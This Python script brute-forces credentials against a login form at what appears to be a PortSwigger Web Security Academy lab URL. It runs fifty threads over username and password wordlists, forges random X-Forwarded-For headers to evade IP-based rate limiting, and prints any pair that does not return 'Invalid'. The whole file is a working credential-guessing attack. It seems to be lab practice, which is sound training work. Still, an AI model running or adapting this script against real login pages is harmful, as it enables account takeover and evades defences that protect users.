import threading
import requests
import time
import random

# setup
found = False
creds = ""
usernames = []
passwords = []
threads = []


# Constants
NUMBER_OF_THREADS = 50
TARGET = "https://0ab600b904405afb8176623e000e0046.web-security-academy.net/login"


# firs step, read the usernames and passwords and make an array for each one
with open("./data/usernames.txt", mode="r") as usernamesFile:
    usernames = usernamesFile.read().split("\n")

with open("./data/passwords.txt", mode="r") as passwordsFile:
    passwords = passwordsFile.read().split("\n")


# helper functions
def slice_array(arr, slices_num):  # can be enhanced
    slices = []
    slice_size = len(arr) // slices_num
    for i in range(slices_num):
        start_index = i * slice_size
        end_index = i * slice_size + slice_size if i < slices_num - 1 else len(arr)
        slice = arr[start_index:end_index]
        slices.append(slice)
    return slices


def login_request(username, password, correct=False):
    global creds, found
    url = TARGET
    cookies = {"session": "9vxgWfzTWVgQQZ9k9zTIRVlsmNSL2tbI"}
    headers = {
        "X-Forwarded-For": f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    }
    data = {"username": username, "password": password}
    req = requests.post(url, data, headers=headers, cookies=cookies)
    if not correct and "Invalid" not in req.text:
        creds = f"{username} with {password}"
        print(creds)
        found = True


def thread_funct(thread_usernames):
    i = 0
    for username in thread_usernames:
        for password in passwords:
            login_request(username, password)
            # login_request(CORRECT_USERNAME, CORRECT_PASSWORD, True)
            time.sleep(3)
            if found:
                break
        if found:
            break


sliced_usernames = slice_array(usernames, NUMBER_OF_THREADS)


for thread_input in sliced_usernames:
    thread = threading.Thread(target=thread_funct, args=(thread_input,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

print(f"Credentials {creds}")
